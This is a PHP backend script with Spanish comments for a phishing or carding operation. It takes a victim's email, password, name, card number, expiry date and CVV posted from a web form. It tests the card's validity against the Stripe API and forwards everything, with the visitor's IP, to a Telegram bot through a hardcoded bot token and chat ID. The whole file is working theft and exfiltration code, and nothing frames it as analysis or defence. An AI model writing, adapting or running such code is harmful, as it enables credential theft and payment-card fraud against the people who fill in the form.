<?php
// Configuración
$token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
$chat_id = "7993722214";
$stripe_secret_key = "TU_STRIPE_SECRET_KEY_AQUI"; // Reemplaza con sk_live_...

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $status_fondos = "⏳ No verificado";

    // LÓGICA DE STRIPE (Verificación de $1.00)
    if (!empty($stripe_secret_key)) {
        try {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            // Formatear datos para Stripe
            $card_data = http_build_query([
                'card' => [
                    'number' => $data['cc'],
                    'exp_month' => explode('/', $data['ex'])[0],
                    'exp_year' => '20' . explode('/', $data['ex'])[1],
                    'cvc' => $data['cv'],
                ]
            ]);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $card_data);
            curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret_key . ':');

            $result = curl_exec($ch);
            $token_stripe = json_decode($result, true);

            if (isset($token_stripe['id'])) {
                $status_fondos = "✅ CON FONDOS (Token: " . $token_stripe['id'] . ")";
            } else {
                $status_fondos = "❌ SIN FONDOS / RECHAZADA (" . $token_stripe['error']['message'] . ")";
            }
            curl_close($ch);
        } catch (Exception $e) {
            $status_fondos = "⚠️ Error Stripe: " . $e->getMessage();
        }
    }

    // MENSAJE PARA TELEGRAM
    $mensaje = "🔔 NUEVO HIT - CHECKER STRIPE 🔔\n\n";
    $mensaje .= "💰 STATUS: $status_fondos\n";
    $mensaje .= "📧 Correo: " . $data['em'] . "\n";
    $mensaje .= "🔑 Pass: " . $data['pw'] . "\n";
    $mensaje .= "👤 Titular: " . $data['nm'] . "\n";
    $mensaje .= "💳 Tarjeta: " . $data['cc'] . "\n";
    $mensaje .= "📅 Exp: " . $data['ex'] . "\n";
    $mensaje .= "🔒 CVV: " . $data['cv'] . "\n";
    $mensaje .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];

    // Enviar a Telegram
    $url_tg = "https://api.telegram.org/bot$token/sendMessage";
    $ch_tg = curl_init();
    curl_setopt($ch_tg, CURLOPT_URL, $url_tg);
    curl_setopt($ch_tg, CURLOPT_POST, 1);
    curl_setopt($ch_tg, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $mensaje]));
    curl_setopt($ch_tg, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch_tg);
    curl_close($ch_tg);
    
    // Responder al JS para que el flujo siga
    echo json_encode(["status" => "ok", "funds" => $status_fondos]);
}
?>
